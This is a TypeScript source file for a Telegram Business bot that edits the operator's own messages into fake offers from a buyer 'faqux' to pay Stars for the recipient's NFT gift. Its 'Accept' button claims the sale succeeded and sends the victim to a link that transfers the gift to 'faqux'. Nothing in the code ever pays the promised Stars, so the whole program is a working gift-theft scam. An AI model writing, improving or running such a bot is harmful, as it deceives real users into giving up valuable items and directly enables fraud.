import "dotenv/config";
import { logger } from "./lib/logger";

interface TelegramApiResponse<T> {
  ok: boolean;
  result?: T;
  error_code?: number;
  description?: string;
}

interface TelegramChat { id: number; }

interface TelegramMessage {
  message_id: number;
  chat: TelegramChat;
  from?: { id: number };
  text?: string;
  business_connection_id?: string;
}

interface TelegramBusinessConnection {
  id: string;
  user: { id: number };
  is_enabled: boolean;
}

interface TelegramCallbackQuery {
  id: string;
  data?: string;
  message?: TelegramMessage;
}

interface TelegramUpdate {
  update_id: number;
  message?: TelegramMessage;
  business_message?: TelegramMessage;
  business_connection?: TelegramBusinessConnection;
  callback_query?: TelegramCallbackQuery;
}

interface TelegramUser { username?: string; }

class TelegramApiError extends Error {
  constructor(readonly method: string, readonly errorCode: number, message: string) {
    super(message);
    this.name = "TelegramApiError";
  }
}

const giftTransferUrl = "tg://send_gift?to=faqux";
const BUYER = "faqux";

const allowedUpdates = ["message", "business_message", "business_connection", "callback_query"];
const activeConnections = new Map<string, number>();

function getConfiguration(): { token: string; adminId: number } {
  const token = process.env["BOT_TOKEN"];
  const adminIdValue = process.env["ADMIN_ID"];
  if (!token) throw new Error("BOT_TOKEN is required");
  if (!adminIdValue || !/^\d+$/.test(adminIdValue)) throw new Error("ADMIN_ID must be numeric");
  const adminId = Number(adminIdValue);
  if (!Number.isSafeInteger(adminId) || adminId <= 0) throw new Error("ADMIN_ID invalid");
  return { token, adminId };
}

function parseGiftName(url: string): { name: string; link: string } | null {
  const m = url.match(/t\.me\/nft\/([A-Za-z0-9]+)-(\d+)/i);
  if (!m) return null;
  const raw = m[1];
  const pretty = raw.replace(/([a-z])([A-Z])/g, "$1 $2");
  return { name: `${pretty} #${m[2]}`, link: `https://t.me/nft/${raw}-${m[2]}` };
}

async function callTelegramApi<T>(token: string, method: string, payload: Record<string, unknown> = {}, timeoutMs = 20000): Promise<T> {
  const response = await fetch(`https://api.telegram.org/bot${token}/${method}`, {
    method: "POST",
    headers: { "content-type": "application/json" },
    body: JSON.stringify(payload),
    signal: AbortSignal.timeout(timeoutMs),
  });
  const body = (await response.json()) as TelegramApiResponse<T>;
  if (!response.ok || !body.ok || body.result === undefined) {
    throw new TelegramApiError(method, body.error_code ?? response.status, body.description ?? "Telegram error");
  }
  return body.result;
}

function getCommand(text: string) {
  const match = /^\/([a-z0-9_]+)(?:@[a-z0-9_]+)?(?:\s+([\s\S]*))?$/i.exec(text.trim());
  if (!match) return null;
  return { name: (match[1] ?? "").toLowerCase(), args: (match[2] ?? "").trim().split(/\s+/).filter(Boolean) };
}

async function safe(token: string, method: string, payload: any) {
  try {
    return await callTelegramApi(token, method, payload);
  } catch (e) {
    console.log(`[FAIL] ${method}:`, e instanceof Error ? e.message : e);
    return null;
  }
}

async function handleOffer(token: string, adminId: number, message: TelegramMessage, args: string[]) {
  const bizId = message.business_connection_id;
  console.log("[OFFER]", args);

  if (!bizId || message.from?.id !== adminId || args.length < 2) return;

  const gift = parseGiftName(args[0]);
  const amount = Number(args[1]);
  if (!gift || !Number.isSafeInteger(amount) || amount <= 0) return;

  const text =
    `Пользователь <a href="https://t.me/${BUYER}"><b>${BUYER}</b></a> предлагает Вам <b>${amount} Stars</b> за подарок <a href="${gift.link}">${gift.name}</a>.`;

  await safe(token, "editMessageText", {
    chat_id: message.chat.id,
    message_id: message.message_id,
    business_connection_id: bizId,
    text,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "✕ Отклонить", callback_data: "dec" },
        { text: "✓ Принять", callback_data: `a:${amount}` },
      ]],
    },
    link_preview_options: {
      url: gift.link,
      prefer_large_media: true,
      show_above_text: false,
    },
  });

  console.log("[OFFER] edited");
}

async function handleCallback(token: string, cb: TelegramCallbackQuery) {
  const msg = cb.message;
  if (!msg) return;

  const data = cb.data || "";
  console.log("[BTN]", data);
  const biz = msg.business_connection_id ? { business_connection_id: msg.business_connection_id } : {};

  if (data.startsWith("a:")) {
    const amount = data.slice(2);

    await safe(token, "answerCallbackQuery", {
      callback_query_id: cb.id,
      text: `Предложение о продаже успешно принято.\n\nПередайте подарок покупателю для зачисления ${amount} Stars на ваш баланс.`,
      show_alert: true,
    });

    let newText = (msg.text || "").replace(/предлагает Вам/i, "купил").replace(/за подарок/i, "");
    if (!newText.trim()) newText = `Пользователь купил подарок за ${amount} Stars.`;

    await safe(token, "editMessageText", {
      chat_id: msg.chat.id,
      message_id: msg.message_id,
      ...biz,
      text: newText,
      parse_mode: "HTML",
      reply_markup: { inline_keyboard: [[{ text: "Передать", url: giftTransferUrl }]] },
    });
    console.log("[ACCEPT] ok");
    return;
  }

  if (data === "dec") {
    await safe(token, "answerCallbackQuery", {
      callback_query_id: cb.id,
      text: "Предложение отклонено.",
      show_alert: true,
    });
    await safe(token, "editMessageText", {
      chat_id: msg.chat.id,
      message_id: msg.message_id,
      ...biz,
      text: "Предложение отклонено.",
      reply_markup: { inline_keyboard: [] },
    });
    console.log("[DECLINE] ok");
  }
}

async function handleUpdate(token: string, adminId: number, update: TelegramUpdate) {
  if (update.business_connection) {
    const c = update.business_connection;
    if (c.is_enabled) activeConnections.set(c.id, c.user.id);
    else activeConnections.delete(c.id);
    console.log("[BIZ]", c.is_enabled);
    return;
  }

  if (update.callback_query) {
    await handleCallback(token, update.callback_query);
    return;
  }

  const message = update.business_message ?? update.message;
  if (!message?.text || message.from?.id !== adminId) return;

  const cmd = getCommand(message.text);
  if (cmd?.name === "offer") await handleOffer(token, adminId, message, cmd.args);
  if (cmd?.name === "start") await safe(token, "sendMessage", { chat_id: message.chat.id, text: "Бот работает." });
}

async function poll(token: string, adminId: number) {
  let offset = 0;
  console.log("[POLL] started");
  while (true) {
    try {
      const updates = await callTelegramApi<TelegramUpdate[]>(token, "getUpdates", {
        offset,
        timeout: 25,
        allowed_updates: allowedUpdates,
      }, 40000);

      for (const u of updates) {
        offset = u.update_id + 1;
        try { await handleUpdate(token, adminId, u); }
        catch (e) { console.log("[UPD ERR]", e); }
      }
    } catch (e) {
      console.log("[POLL ERR]", e instanceof Error ? e.message : e);
      await new Promise(r => setTimeout(r, 3000));
    }
  }
}

async function start() {
  const { token, adminId } = getConfiguration();
  await callTelegramApi(token, "deleteWebhook", { drop_pending_updates: true });
  console.log("[WEBHOOK] cleared");
  const me = await callTelegramApi<TelegramUser>(token, "getMe");
  console.log("[START]", me.username);
  logger.info({ username: me.username }, "connected");
  void poll(token, adminId);
}

start().catch(console.error);
